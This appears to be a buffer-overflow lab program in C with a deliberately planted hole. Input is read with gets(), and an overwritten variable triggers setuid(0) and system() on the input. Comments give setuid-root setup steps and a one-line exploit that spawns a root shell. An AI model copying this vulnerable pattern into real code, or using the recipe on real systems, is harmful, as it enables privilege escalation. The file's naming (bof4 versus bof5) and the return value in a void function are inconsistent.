// AFTER => bof4.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#define BUF_SIZE 128
#define KEY 0x12345678
#define G "\033[32m"
#define Y "\033[33m"
#define E "\033[0m"

// ASLR OFF
// COMPILE $ gcc -fno-stack-protector bof5.c -o bof5
// SETUID  $ sudo chown root:root bof5
//         $ sudo chmod 4755 bof5
// EXPLOIT $ (python -c "print '/bin/sh\x00'+'\x78\x56\x34\x12'+'a'*132";cat) | ./bof5

void vuln() {
    int innocent;
    char buf[BUF_SIZE];

    puts(G "enter your name :)" E);
    gets(buf);
    printf("Hello " Y "%s" E "!\n", buf);

    if (innocent == KEY) {
        if (setuid(0)) {
            perror("setuid");
            return 1;
        }
        system(buf);
    }
}

int main(){
    vuln();
    return 0;
}
